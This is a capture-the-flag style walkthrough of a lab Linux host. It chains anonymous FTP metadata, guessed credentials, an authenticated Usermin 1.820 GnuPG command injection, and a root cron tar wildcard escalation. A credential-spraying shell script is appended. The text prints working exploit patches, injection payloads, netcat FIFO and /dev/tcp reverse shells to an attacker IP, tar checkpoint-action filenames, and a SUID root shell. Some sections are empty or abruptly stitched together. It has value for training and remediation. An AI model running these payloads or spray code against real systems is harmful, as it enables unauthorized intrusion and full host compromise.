01

Reconnaissance

Four ports, and the banner that lies

The box is called charlie and it is a Linux host with a short port list. Nothing here needs a fuzzer. Every decision in this walkthrough comes from reading four banners correctly, and one of those banners is mislabelled by the scanner.

Four ports. Three of them are the Ubuntu default install. The fourth is the box.

Port Service What it tells us
21 vsftpd 3.0.5 ftp-anon: Anonymous FTP login allowed, and a backup directory exists
22 OpenSSH 8.9p1 publickey,password — both methods offered

20000 MiniServ 1.820 A webmin-family panel, on the user port

The FTP line is the only one that volunteers something: an anonymous login and a directory that was not there by default. That is where the enumeration budget goes.

This was a targeted scan: the four ports came from the service list this range uses, not from a blind sweep. Sweep the full range anyway before you commit — it costs a minute and it is the only way to be sure nothing else is listening:

command
nmap -p- -T4 --min-rate 2000 -n -Pn 192.168.161.157

1.2 Port 80 is a dead end, and that is information

The two lines worth having from the scan are the server header and the page title:

output
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

/var/www/html is untouched. No vhost, no CMS, no upload form. A default page is worth thirty seconds of whatweb, not a gobuster run — and it tells you the box author did not intend HTTP/80 to be the way in.

1.3 Port 20000: the banner says Webmin, the port says Usermin

MiniServ is the HTTP daemon that both Webmin and Usermin use. nmap sees the string Webmin in the banner and labels the service Webmin httpd. That label is wrong here, and it is wrong in a way that costs time:

Product Default port What it is
Webmin 10000 System administration — runs as root, manages the whole host
Usermin 20000 Per-user webmail/account panel — runs as the logged-in user

Two consequences:

  1. CVE-2019-15107 is not this box. That is the Webmin 1.890–1.920 backdoor in password_change.cgi. Version 1.820 is outside the range and Usermin does not have that endpoint. Searching "MiniServ 1.820 exploit" lands on it anyway.
  2. The right hit is authenticated. EDB 50234, Usermin 1.820 — Remote Code Execution (Authenticated), needs a username and a password before it does anything. So the panel is not the entry point either — it is the second half of a two-step chain.

The confirmation is not in the banner either — it is in the CGI paths. Every request the exploit makes exists on this host: /session_login.cgi, /gnupg/list_keys.cgi, /gnupg/secret.cgi, /gnupg/edit_key.cgi. gnupg is a Usermin module, and 20000 is the Usermin port. Note also that nmap reported _http-title: Site doesn't have a title for 20000 — the login page is a frameset, so there is no title string to read. Use the paths, the port and the version.

That leaves a single question: where do credentials for a per-user panel come from on a box with one anonymous service?

1.4 Host identity

Confirmed later, from the shell, so it belongs in the notes rather than in the scan:

command
uname -a; lsb_release -d
output
Linux lab-pwk2-student-cl6-157-ubuntu2204-charlie-240-111 5.15.0-52-generic #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
Description:    Ubuntu 22.04.1 LTS

Ubuntu 22.04.1 with a 5.15 kernel. Modern enough that kernel exploits are a waste of the remaining budget, and patched enough that the intended path has to be a configuration or application flaw. It is.

1.5 What chapter 01 decided

  • 21/tcp — the only unauthenticated service, and it hands out a directory called backup.
  • 22/tcp — noted, not tested yet. It will matter in chapter 05 for the wrong reason.
  • 80/tcp — default page, no content, closed.
  • 20000/tcp — Usermin 1.820, exploitable after authentication.

Next: read the backup directory and see what the authors left in the document metadata.

02

Anonymous FTP

Five PDFs, three authors, nine guesses

An anonymous FTP share is usually worth one ls and nothing else. Here it is the whole credential chain: five documents, three author names, and a password rule simple enough that nine attempts beat a wordlist.

2.3 Three names become three accounts

The obvious usernames are robert, mark, cassie. The non-obvious part is the password. The range has a house style, and the hint is in how the accounts are named: single lowercase first names. The cheapest hypothesis that fits is the password is the username with the case flipped — so each name yields three candidates: cassie, Cassie, CASSIE.

That is 3 users × 3 passwords = 9 attempts, not a wordlist. Which is the point: a 3420-guess ftp-brute run against this box returns zero accounts, because none of the three usernames were in the list it was given. Brute force without the names is not slow, it is aimed at nothing.

Two scripts cover both approaches:

  • scripts/gencreds_charlie_7f3a.sh — turns harvested names into username and password lists, including the case variants and common suffixes, if you want a wider net.
  • scripts/charlie_ftp_credtest_7f3a.py — the 9-attempt deterministic test used here. No guessing beyond the documented rule.

Cassie
Mark
Robert
EOF

./scripts/gencreds_charlie_7f3a.sh names.txt users.txt pw.txt

2.5 FTP is read-only, so it is not a foothold

The obvious next move is to drop an authorized_keys into /home/cassie/.ssh and log in over SSH. It does not work, and the error tells you why:

output
ftp> mkdir .ssh
550 Permission denied.
ftp> put charlie.pub -o .ssh/authorized_keys
550 Permission denied.
ftp> quote SITE CHMOD 600 .ssh/authorized_keys
500 Unknown SITE command.

Every write path fails the same way — MKD, STOR and APPE return 550, and SITE CHMOD is not implemented at all. That combination is what a vsftpd with write_enable=NO looks like: the service is configured to serve files, not accept them. Even an authenticated cassie cannot upload, rename or create a directory. The FTP service is a read primitive and nothing else.

Useful details that fall out of this:

  • A .ssh directory already exists with an authorized_keys inside it, mode 600, owned by cassie. By chapter 05 that file holds a 91-byte ed25519 key that still does not get us in.
  • Any file written to /home/cassie must be written by cassie through some other channel. That is exactly what the next chapter builds.

2.6 What chapter 02 produced

  • Three usernames: cassie, mark, robert.
  • One working password: cassie:cassie (case variants also valid).
  • The user flag, read over anonymous FTP.
  • A read-only FTP service — a way to read files as cassie, but not to write them.

Read access as cassie plus a panel that runs as cassie is a complete chain if the panel has a command injection. The panel is Usermin 1.820.

03

Usermin & GnuPG

The module that pastes a name into a shell

The panel on 20000 is Usermin 1.820. The credentials from chapter 02 work on it. What turns a mail-reading panel into code execution is a single line in the GnuPG module that pastes a key's display name into a shell pipeline.

3.1 Logging in

The login form posts to /session_login.cgi. Two cookies matter: redirect=1 stops Usermin from bouncing you to a "session expired" page, and testing=1 stops it from invalidating the session when the User-Agent changes between requests — both are needed when a script, not a browser, is driving the session. EDB 50234 sets them on every request:

command
headers = {'Cookie': 'redirect=1; testing=1;', 'Referer': target}
login = session.post(target + "/session_login.cgi", headers=headers, verify=False,
                     data={"user": username, "pass": password})

The reliable "am I logged in" signal is not the HTTP status — the login page answers 200 whether or not the credentials worked. It is whether the response contains the authenticated navigation. webmin_search.cgi only appears once a session exists, and that is the exact check the exploit makes before printing [+] Login successfully.

3.2 The module that matters

After login, the sidebar has the usual per-user modules: mail, files, cron, SSH keys, GnuPG Keys. That last one is the target.

output
https://192.168.161.157:20000/gnupg/

Four CGI endpoints do the work:

Endpoint Purpose
/gnupg/list_keys.cgi renders the keyring, one edit_key.cgi?idx=N link per key
/gnupg/secret.cgi creates a new secret key from a name and email form field
/gnupg/import.cgi imports an ASCII-armoured key (mode=2 with a text field)
/gnupg/edit_key.cgi?idx=N shows a key's details — and shells out to gpg --fingerprint

The keyring on a fresh account is empty. That matters later: with no keys there is nothing to trigger, so the exploit has to create one first.

3.3 EDB 50234 is an authenticated RCE

The public exploit is EDB 50234, Usermin 1.820 — Remote Code Execution (Authenticated), reworked by Numan Turle and Tunahan TEKEOĞLU. It does exactly three things:

  1. POSTs name and email to /gnupg/secret.cgi, with the payload hidden in name.
  2. Reads /gnupg/list_keys.cgi and picks a key index out of the HTML.
  3. Requests /gnupg/edit_key.cgi?idx=N.

Step 3 is the execution. In Usermin's gnupg-lib.pl, the function that prints a key's fingerprint builds a shell pipeline:

output
open(GPG, "$gpgpath --fingerprint \"$_[0]->{'name'}->[0]\" 2>/dev/null |");

The key's display name — attacker-controlled since step 1 — is interpolated between double quotes and handed to a shell. There is no escaping and no list form, so a name containing "; closes the quote, ends the gpg command, and starts a new one.

3.4 The payload shape

The name is spliced as "...\"<NAME>\"...". To land a command, the name must close the quote, terminate the statement, run, and then reopen a quote so the rest of the line stays syntactically valid:

output
NAME = ";id;echo "

Which produces:

command
gpg --fingerprint "";id;echo "" 2>/dev/null |

id runs. The trailing echo "" absorbs the remaining quote and the redirect. This is the wrapper the exploit script applies for you:

command
payload = 'id > /home/cassie/exec_test.txt 2>&1;'
name    = '";{}echo "'.format(payload)      # ->  ";id > ... 2>&1;echo "

The trailing semicolon is not optional. The wrapper appends echo " immediately after your payload. A payload ending in 2>&1 becomes 2>&1echo ", which /bin/sh rejects with Bad fd number before running anything. End every payload with ;.

3.5 Who the command runs as

Usermin's miniserv runs each user's CGI as that user, not as root. So the injection is code execution as cassie, confirmed by reading back the id output in chapter 04:

output
uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)

That is the correct altitude for this box. There is no root-owned Webmin here to fall out of; the panel is a per-user service, and the privilege boundary it crosses is "cassie can only read" → "cassie can run commands". Root comes from the cron job in chapter 06.

3.6 The public exploit does not run as shipped

On this target the published script dies before it reaches step 3:

output
[+] Target https://192.168.161.157:20000
[+] Login successfully
[+] Setup GnuPG
[+] Payload {'name': '";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.158 1337 >/tmp/f;echo "', 'email': '1337@webmin.com'}
[+] Setup successful
[+] Fetching key list
Traceback (most recent call last):
  File "/home/kali/Desktop/exploit.py", line 73, in exploit
    last_gets_key = re.findall("edit_key.cgi\?(.*?)'", str(key_list.content))[-2]
IndexError: list index out of range

Two separate defects, and they interact:

  1. [-2] assumes at least two keys. re.findall returns a list of matches; indexing [-2] throws the moment the keyring renders fewer than two edit_key.cgi links. On a fresh account with an empty keyring — or one where the create step failed — that list is empty.
  2. "successfully" is page boilerplate. The script uses the presence of that word in the secret.cgi response as proof that the key was created. It appears on the page whether or not gpg produced anything, so [+] Setup successful is not evidence.

On this box the create step does work (gpg is older than 2.3, so it takes the workstation key-generation path without a passphrase prompt), which means defect 1 was the blocker: the key existed, but the index arithmetic crashed before the trigger request.

Chapter 04 covers the two ways out — a two-line patch to the published script, and the rewrite that was actually used.

3.7 What chapter 03 established

  • Valid session on Usermin 1.820 as cassie, using the FTP credentials.
  • The GnuPG module is reachable and its four CGIs behave as the exploit expects.
  • The sink is open(GPG, "$gpgpath --fingerprint \"<name>\" 2>/dev/null |") — command injection through the key display name.
  • Execution context is cassie (uid 1000), not root.
  • The published exploit needs a fix before it can reach the sink.
04

Foothold

Fixing EDB 50234, proving execution without a shell

Two ways to fix EDB 50234, and the one that was actually used. The goal is not a shell yet — it is proof that a command runs as cassie. Everything after that is file writes.

4.1 Fix option A — two edits to the published script

The published script has the sink right and the bookkeeping wrong. Two edits are enough (scripts/edb-50234-patched.py):

Patch A — stop trusting the word successfully, and keep the key indexes you actually found:

command
        # [PATCH A] "successfully" is boilerplate -- it is on the page whether or not
        # gpg created anything. Probe the keyring and keep the indexes we found.
        probe = session.post(target + "/gnupg/list_keys.cgi", verify=False)
        check_exp = re.findall(r"edit_key\.cgi\?idx=(\d+)", str(probe.content))

Patch B — no [-2], and rebuild the query string in the form edit_key.cgi expects:

command
            # [PATCH B] no [-2]: take the last index that actually exists, and
            # rebuild the query string the way edit_key.cgi expects it.
            last_gets_key = "idx={}".format(re.findall(r"edit_key\.cgi\?idx=(\d+)", str(key_list.content))[-1])

That is a genuinely minimal diff — the rest of the script, including the ";<payload>echo " wrapper, is untouched. It compiles and it will reach the trigger. It still has the original's weak reporting: if no key exists it prints [-] An unexpected error occurred, which tells you nothing about why.

4.2 Fix option B — the rewrite that was used

scripts/exploit_usermin_1820_7f3a.py is the script that produced the foothold. It keeps the same injection but makes the state visible:

  • reads the keyring before and after key creation, and works on the difference;
  • prints the gpg error Usermin returned instead of crashing on an index;
  • falls back to importing a locally generated key whose UID carries the payload, for boxes where gpg >= 2.3 refuses Usermin's batch stanza;
  • --payload for an arbitrary command, --idx to force a key, --debug to dump HTTP bodies.

One honest note about the header. The rewrite's docstring blames the crash on gpg >= 2.3 refusing to create the key. On this box creation succeeded — [+] Key creation returned no error — so the immediate blocker was the [-2] index, not the gpg path. Both failures are handled by the same script; only one of them happened here.

4.3 First run: prove execution, do not ask for a shell

A reverse shell is the wrong first test. If it fails you cannot tell whether the command ran and egress is filtered, or the command never ran at all. Write a file instead:

command
python3 scripts/exploit_usermin_1820_7f3a.py \
  -u 192.168.161.157 -l cassie -p cassie \
  --lhost 192.168.45.158 --lport 1337 \
  --payload 'id > /home/cassie/exec_test.txt 2>&1;'
output
[+] Target https://192.168.161.157:20000
[+] Login successfully
[*] Keys before: [0, 1, 2, 3, 4, 5, 6]
[*] Creating key through secret.cgi
[+] Key creation returned no error
[+] New key index 7
[*] Triggering https://192.168.161.157:20000/gnupg/edit_key.cgi?idx=7
[+] Request returned - command ran in the pipeline

Request returned is the script's wording, not proof. The proof is the file. Read it back over the FTP session from chapter 02 — same credentials, no shell needed:

command
lftp -u cassie,cassie 192.168.161.157 -e "get exec_test.txt -o /tmp/exec_test.txt; bye"
cat /tmp/exec_test.txt
output
uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)

That single line settles three things at once:

  1. The injection fires — this is not a timing artefact or a hopeful [+].
  2. It runs as cassie, so Usermin's per-user CGI model is exactly as expected.
  3. The account is in adm, which means /var/log/auth.log is readable. That becomes decisive in chapter 05.

4.4 Why the reverse shell did not arrive

The default payload is the usual FIFO shell:

command
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.158 1337 >/tmp/f;

nc -lvnp 1337 stayed silent, and the HTTP request ended in a ConnectionError. That error is not evidence of failure and not evidence of success:

  • cat /tmp/f blocks until something is written to the FIFO, so the shell process stays alive and the CGI never returns. A timeout or dropped connection is the expected shape of a working FIFO payload as well as a broken one.
  • If egress to 192.168.45.0/24 is filtered, nc hangs too, with the same visible result.

Two ways to disambiguate, in order of cost:

command
## 1. no FIFO, no blocking: does a plain callback arrive at all?
python3 scripts/exploit_usermin_1820_7f3a.py -u 192.168.161.157 -l cassie -p cassie \
  --lhost 192.168.45.158 --lport 1377 \
  --payload 'bash -c "bash -i >& /dev/tcp/192.168.45.158/1377 0>&1" &'
command
## 2. skip the network entirely: does the command run and can it write?
python3 scripts/exploit_usermin_1820_7f3a.py -u 192.168.161.157 -l cassie -p cassie \
  --lhost 192.168.45.158 --lport 1377 \
  --payload 'date > /home/cassie/ts.txt 2>&1; id >> /home/cassie/ts.txt 2>&1;'

On this engagement the callback never arrived and the file write always did. The conclusion is narrow and useful: the injection works, the outbound path does not. So the exploit is used as a file-write primitive, and the shell has to come from a service that speaks inbound — SSH.

4.5 Turning RCE into a key on disk

With a write primitive as cassie, the authorized_keys problem from chapter 02 dissolves. Encode the public key so no shell metacharacter survives the trip through the gpg UID, and write it:

command
KEY=$(base64 -w0 ~/.ssh/charlie.pub)
python3 scripts/exploit_usermin_1820_7f3a.py \
  -u 192.168.161.157 -l cassie -p cassie \
  --lhost 192.168.45.158 --lport 1337 \
  --payload "echo $KEY|base64 -d>/home/cassie/.ssh/authorized_keys;"
command
lftp -u cassie,cassie 192.168.161.157 -e "ls .ssh; bye"
output
-rw-------    1 cassie    cassie          91 Nov 24 22:50 authorized_keys

91 bytes, mode 600, owned by cassie — exactly the length of one ssh-ed25519 line. The file is right. Which makes the next chapter's failure genuinely surprising.

4.6 What chapter 04 produced

  • Confirmed command execution as cassie via /gnupg/edit_key.cgi → gpg --fingerprint "<name>".
  • A working rewrite of EDB 50234, plus a two-edit patch for the original.
  • A file-write primitive in /home/cassie, including .ssh/authorized_keys.
  • No reverse shell — egress is not usable, so the interactive shell must come from SSH.
05

SSH denied

A 91-byte key and a pre-auth deny list

This is the chapter that saves an hour on a similar box. Everything about the SSH access was correct — the key, the file, the mode, the ownership, the password. sshd refused anyway, and the reason was in a log line the account could read all along.

5.1 The failure

command

5.2 Read the log, not the error

cassie is in the adm group, so /var/log/auth.log is readable without any privilege escalation. That is the whole reason this chapter exists:

DenyUsers is evaluated before authentication. sshd never looks at the key and never checks the password; it decides the account is not allowed and closes the connection with the same generic message it uses for a bad password. That is deliberately uninformative to the client — and it is fully explained in the server log.

If a key is provably correct and still fails, check in this order: DenyUsers/AllowUsers in the main config, Match blocks and their DenyUsers, Include directives (Ubuntu ships /etc/ssh/sshd_config.d/*.conf), then PAM (/etc/pam.d/sshd, pam_access, account required). All of these reject before the key is ever tried.

5.3 Why the password path looked broken too

Because it was blocked by the same line. DenyUsers does not care which method you use — publickey, password, keyboard-interactive are all refused for that account. This is the trap: two failures that look like two independent credential problems, when in fact there is one config line and the credentials were never evaluated.

The tell that distinguishes them: a correct password fails identically to an incorrect one, and a correct key fails identically to a missing one. When failure is independent of credential quality, the decision is being made before the credential is read.

5.4 Removing the line requires root — which is why the order matters

Privilege escalation

A bare * in a root cron job

sudo is closed, the Usermin install is root-owned, and the kernel is patched. The way up is a cron job that runs tar as root from a directory cassie owns. That combination is a root shell with a two-minute delay.

6.1 What cassie can do

command
id; sudo -l
output
uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)

Sorry, user cassie may not run sudo on lab-pwk2-student-cl6-157-ubuntu2204-charlie-240-111.

No sudo entry at all — not even (ALL) NOPASSWD: /usr/bin/less. The group list is ordinary desktop Ubuntu; adm buys log reading, cdrom/dip/plugdev buy nothing remotely. Three obvious leads and what happened to each:

Lead Result
/etc/usermin root:bin 755 — world-readable, not writable. The config is not a privesc
/etc/webmin does not exist — this is Usermin only
/var/backups apt state only, root:root, nothing writable
/opt/admin owned by cassie:cassie and empty
/etc/cron.d/ world-readable, and there is a custom job in it

An empty directory owned by a normal user is not interesting by itself. An empty directory owned by a normal user that a root cron job cds into is the whole box.

6.2 The cron job

command
stat -c '%A %U:%G %n' /opt/admin; ls -A /opt/admin; cat /etc/cron.d/2minutes
output
drwxr-xr-x cassie:cassie /opt/admin

*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *

(ls -A prints nothing: the directory is empty. That is the point — cassie owns a directory that root's cron job enters on a schedule.)

Read that command the way the shell will:

  1. cd /opt/admin — a directory cassie owns.
  2. tar -zxf /tmp/backup.tar.gz * — the * is expanded by the shell, as root, in that directory.

So cassie controls the arguments that tar receives. That is the vulnerability: no privilege escalation bug in tar, just a program being handed an argv it was never meant to parse.

6.3 Why tar treats filenames as options

GNU tar reads its options and its file list from the same argv. getopt_long sees an argument starting with -- and parses it as a long option, wherever it appears. There is no "these came from a glob, treat them as files" mode.

Two options are enough:

Filename created by cassie How tar reads it
--checkpoint=1 enable checkpointing on every record
--checkpoint-action=exec=sh pwn.sh at each checkpoint, run sh pwn.sh

--checkpoint-action=exec= runs its argument with /bin/sh -c, with the working directory tar inherited — /opt/admin. So the payload is just a shell script sitting next to it.

The subtle part that makes this work from a single touch: glob expansion happens after word splitting and is never re-split. A file literally named

output
--checkpoint-action=exec=sh pwn.sh

arrives as one argv element, spaces and all. tar sees one long option whose value is exec=sh pwn.sh. If you tried to type it as a command argument you would need quoting; the glob does the quoting for you.

6.4 Reproducing it before touching the box

Never plant a cron payload you have not seen fire. The exact command shape — same glob, same directory ownership, same two filenames — in a disposable directory:

cd "$BASE/admin"

cat > pwn.sh <<'EOF'

id > /tmp/tartest/EXECUTED.txt
EOF

touch -- '--checkpoint-action=exec=sh pwn.sh'

ls -b1
output
--checkpoint-action=exec=sh\ pwn.sh
--checkpoint=1
pwn.sh

ls -b prints the space as \, which is a useful sanity check that the filename really contains one space and not two.

output
tar: pwn.sh: Not found in archive
tar: Exiting with failure status due to previous errors

uid=0(root) gid=0(root) groups=0(root)

Three observations from that run, each of which matters on the target:

  1. The action fires even though the archive does not exist. tar opens the (missing) archive, the gzip child fails, but the option list has already been parsed and the checkpoint action runs anyway. On the real box /tmp/backup.tar.gz may or may not be there; you do not need to create it.
  2. tar exits non-zero and prints an error. That is normal. A failed cron job that has already run your script is still a win.
  3. id is uid=0. The exec'd command inherits tar's UID, which in cron is root.

6.6 Using it

command
/home/cassie/rootbash -p -i
output
rootbash-5.1# cat proof.txt
06fc3530c91d86d66a81d84a116f4eb0

-p is mandatory. bash drops its effective UID when it starts unless it is invoked with -p, so a bare /home/cassie/rootbash gives you a shell that says uid=1000(cassie) and cannot read /root. With -p, the effective UID stays 0. One-shot form, no interactive shell:

command
/home/cassie/rootbash -p -c 'id; cat /root/proof.txt'

If SUID does not work

If /home is mounted nosuid, the binary will exist with the s bit set and still run as cassie (findmnt -no OPTIONS /home). In that case the SUID copy is useless and root has to come from the cron job itself — add a callback to the payload:

command
cat > /opt/admin/pwn.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.158 1377 > /tmp/f
EOF
chmod +x /opt/admin/pwn.sh

with nc -lvnp 1377 already listening. That path depends on egress from the target to your host, which did not work on this engagement (chapter 04) — which is exactly why the payload copies the flag out as well as the shell. Whichever of the three outcomes arrives first is enough.

6.7 Why this is the intended path

Everything about the box points here:

  • /opt/admin is empty and owned by cassie — the only writable directory that any root process touches on a schedule.
  • The cron file is world-readable and named 2minutes, which is as close to a hint as a box author gets.
  • tar is invoked with a bare * from that directory. That is not a default in any Ubuntu install; it was written by hand.
  • The command would be safe with tar -zxf /tmp/backup.tar.gz -C /opt/admin . or with --no-unquote/./*. The absence of any of those is the box.

6.8 What chapter 06 established

  • cassie owns /opt/admin; a root cron job runs tar -zxf /tmp/backup.tar.gz * inside it.
  • The * lets cassie inject --checkpoint=1 and --checkpoint-action=exec=sh pwn.sh as options.
  • Verified in a sandbox reproduction: the action executes as uid=0, even without the archive.
  • On the target: SUID rootbash in /home/cassie and proof.txt copied out.
  • rootbash -p -i gives an interactive root shell; -p is what preserves the effective UID.

No output is the success condition: the directory is empty again, so the next tick has nothing to act on.

7.4 Remediation

# Finding Fix
1 Anonymous FTP exposes a backup share with staff documents anonymous_enable=NO; if anonymous access is required, keep personal metadata out of the share
2 Document metadata leaks usernames strip dc:creator, Author, LastModifiedBy before publishing; Word: Inspect Document → Remove Personal Information
3 Password equals username (case variants) a password policy that rejects username-derived secrets, plus MFA on the panel
4 Usermin 1.820 GnuPG RCE (open(GPG, "... \"<name>\" ...")) upgrade Usermin; the fix is quoting/list form on the gpg invocation
5 DenyUsers cassie used as an access control remove the account or lock it properly; do not rely on a pre-auth deny list as a compensating control — it silently breaks legitimate key access and hides the real state
6 Root cron runs tar -zxf /tmp/backup.tar.gz * in a user-writable directory tar -zxf /tmp/backup.tar.gz -C /opt/admin . — or better, ./*; never let a wildcard reach tar as options

The two that matter most are 4 and 6: the first is remote code execution as a user, the second is root. Either one alone is a full compromise on this box because the flags are readable by their respective accounts.

7.5 What to take to the next box

Read the banner, then doubt it. MiniServ/1.820 was labelled Webmin httpd by nmap. The port (20000) and the CGI paths said Usermin. Chasing CVE-2019-15107 would have burned the box's whole budget on a product that is not installed.

Metadata is a user list. Five PDFs on an anonymous share produced three usernames. No wordlist required. exiftool -a -G1 on every document you find is ten seconds and often the difference between a 3420-guess brute force that fails and a nine-guess login that works.

Verify the primitive before you ask it for a shell. id > file and read it back. It took one request and it made the whole difference between "the exploit does not work" and "egress is blocked, the exploit is fine". A ConnectionError on a FIFO payload is not a verdict.

When a correct credential fails, stop testing the credential. DenyUsers rejects before authentication, so no amount of re-keying or password retrying was ever going to work. /var/log/auth.log said so, and cassie could read it via adm. The failure was independent of credential quality — that is the tell.

Reproduce the privesc before planting it. A ten-line sandbox test of the exact tar command shape proved the checkpoint action fires as uid=0, and proved it fires even without the archive. Two minutes of local work removed all the guesswork from a two-minute-delay cron job.

    """Pull Usermin's 'Failed to create secret key : <pre>gpg: ...</pre>' text."""

                  re.S | re.I)

  fi

  if normalize "$USERS_FILE" "$USERS_NORM"; then
    sub "users.txt : $(wc -l < "$USERS_NORM") username(s) [$USERS_FILE]"
  else
    warn "no usable usernames in $USERS_FILE - spray stage will be skipped"
  fi

  if normalize "$PASS_FILE" "$PASS_NORM"; then
    sub "pass.txt  : $(wc -l < "$PASS_NORM") password(s) [$PASS_FILE]"
  else
    warn "no usable passwords in $PASS_FILE - spray stage will be skipped"
  fi

  (( $(wc -l < "$USERS_NORM") > 0 && $(wc -l < "$PASS_NORM") > 0 )) || DO_SPRAY=0
}
DO_SPRAY=${DO_SPRAY:-1}

scan() {
  if (( DO_SCAN == 0 )); then
    msg "scan skipped (--no-scan) - reading $OUT/nmap/*.xml"
    local xml
    for xml in "$OUT"/nmap/*.xml; do
      [[ -f $xml ]] || continue
      parse_xml "$xml" >> "$SERVICES_TSV" || warn "cannot parse $xml"
    done
    sort -u -t"$TAB" -k1,1V -k2,2n "$SERVICES_TSV" -o "$SERVICES_TSV"
    msg "open ports recovered: $(wc -l < "$SERVICES_TSV")"
    (( $(wc -l < "$SERVICES_TSV") > 0 )) || warn "no nmap XML found in $OUT/nmap - run without --no-scan first"
    return 0
  fi

  [[ -n $NMAP ]] || { warn "nmap not available - scan skipped"; return 0; }
  hr
  msg "nmap: -p$PORTS -T4 (targets: $(wc -l < "$IPS_NORM"))"
  if (( DRY == 1 )); then
    sub "[dry-run] nmap -Pn -sV -p$PORTS -T4 --open -oA $OUT/nmap/scan -iL $IPS_NORM"
    return 0
  fi
  "$NMAP" -Pn -sV -p"$PORTS" -T4 --open -oA "$OUT/nmap/scan" \
      -iL "$IPS_NORM" > "$OUT/nmap/scan.stdout" 2>&1
  local rc=$?
  (( rc == 0 )) || warn "nmap exited $rc (see $OUT/nmap/scan.stdout)"

  if [[ -f $OUT/nmap/scan.xml ]]; then
    parse_xml "$OUT/nmap/scan.xml" > "$SERVICES_TSV" || warn "cannot parse nmap XML"
    ok "open ports: $(wc -l < "$SERVICES_TSV")"
  else
    warn "nmap produced no XML"
  fi
}

parse_xml() { # nmap xml -> TSV: host port proto service product version
  python3 - "$1" <<'PY'
import sys, xml.etree.ElementTree as ET
try:
    root = ET.parse(sys.argv[1]).getroot()
except Exception as exc:
    sys.stderr.write("parse error: %s\n" % exc)
    sys.exit(1)
for host in root.findall('host'):
    st = host.find('status')
    if st is not None and st.get('state') != 'up':
        continue
    addr = ''
    for a in host.findall('address'):
        if a.get('addrtype') in ('ipv4', 'ipv6'):
            addr = a.get('addr') or ''
            break
    if not addr:
        continue
    for p in host.findall('ports/port'):
        s = p.find('state')
        if s is None or s.get('state') != 'open':
            continue
        svc = p.find('service')
        name = (svc.get('name') if svc is not None else '') or '-'
        prod = (svc.get('product') if svc is not None else '') or '-'
        ver = (svc.get('version') if svc is not None else '') or '-'
        print('\t'.join([addr, p.get('portid', ''), p.get('protocol', ''),
                         name, prod, ver]))
PY
}

#-------------------------------- plan stage ---------------------------------
svc_to_proto() { # nmap service name, port -> protocol (empty = not sprayable)
  local n=${1,,} p=${2:-0}
  case "$n" in
    ftp|ssh|telnet|smtp|mysql|vnc) echo "$n"; return;;
    postgresql|postgres) echo postgres; return;;
    ms-sql-s|mssql) echo mssql; return;;
    microsoft-ds|netbios-ssn|smb) echo smb; return;;
    ldap|ldaps|globalcatldap*) echo ldap; return;;
    wsman) echo winrm; return;;
  esac
  case "$p" in
    21) echo ftp;;              22) echo ssh;;
    23) echo telnet;;           25|587|465) echo smtp;;
    3306) echo mysql;;          5900|5901) echo vnc;;
    5432) echo postgres;;       1433) echo mssql;;
    445|139) echo smb;;         389|636|3268|3269) echo ldap;;
    5985|5986) echo winrm;;
  esac
}

service_wanted() { [[ ",${SERVICES}," == *",$1,"* ]]; }

build_plan() {
  local addr port proto sname prod ver
  [[ -s $SERVICES_TSV ]] || return 0
  while IFS="$TAB" read -r addr port proto sname prod ver; do
    [[ -z ${addr:-}${port:-} ]] && continue
    local p; p=$(svc_to_proto "${sname:-}" "$port")
    [[ -z $p ]] && continue
    service_wanted "$p" || continue
    printf '%s\t%s\t%s\n' "$addr" "$port" "$p" >> "$PLAN"

  awk -F'\t' '!seen[$1 FS $3]++' "$PLAN" | sort -t"$TAB" -k1,1V -k3,3 -k2,2n > "$PLAN.tmp"

}

#-------------------------------- spray stage --------------------------------
hydra_svc() { case $1 in ldap) echo ldap2;; smb|winrm) echo "";; *) echo "$1";; esac; }

sprayer_for() { # proto -> hydra|nxc|none
  case "$FORCE_SPRAYER" in
    hydra) echo hydra; return;;
    nxc)   echo nxc;   return;;
  esac
  if [[ -n $HYDRA ]]; then echo hydra; return; fi
  if [[ -n $NXC   ]]; then echo nxc;   return; fi
  echo none
}

run_hydra() { # proto ip port password
  local proto=$1 ip=$2 port=$3 pw=$4 svc
  svc=$(hydra_svc "$proto")
  [[ -n $svc ]] || { echo "[!] hydra has no module for $proto"; return 2; }
  if [[ $proto == vnc ]]; then
    "$HYDRA" -I -P <(printf '%s\n' "$pw") -s "$port" -t 1 -w "$TIMEOUT" "$ip" vnc 2>&1
    return $?
  fi
  "$HYDRA" -I -L "$USERS_NORM" -p "$pw" -s "$port" -t "$THREADS" -w "$TIMEOUT" \
           "$ip" "$svc" 2>&1
  return $?
}

run_nxc() { # proto ip port password
  local proto=$1 ip=$2 port=$3 pw=$4
  local aux="$OUT/norm/.pw_one"
  printf '%s\n' "$pw" > "$aux"
  "$NXC" "$proto" "$ip" -u "$USERS_NORM" -p "$aux" --continue-on-success --port "$port" 2>&1
  local rc=$?
  rm -f "$aux"
  return $rc
}

spray_service() { # proto ip port
  local proto=$1 ip=$2 port=$3
  local log="$OUT/logs/${ip//[^A-Za-z0-9._-]/_}_${port}_${proto}.log"
  local tool; tool=$(sprayer_for "$proto")
  local rounds=0 evidence=0 errors=0 hits=0 rc pw
  : > "$log"

  msg "spray $proto $ip:$port  (tool: $tool)"

  if [[ $tool == none ]]; then
    printf '%s\t%s\t%s\t%s\t%s\n' "$proto" "$ip" "$port" "INCONCLUSIVE" "no sprayer available" >> "$VERDICTS"
    warn "  no sprayer available - $proto $ip:$port not tested"
    return 0
  fi

  if (( DRY == 1 )); then
    sub "[dry-run] $(wc -l < "$USERS_NORM") users x $(wc -l < "$PASS_NORM") passwords"
    return 0
  fi

  while IFS= read -r pw; do
    [[ -n $pw ]] || continue
    rounds=$((rounds + 1))
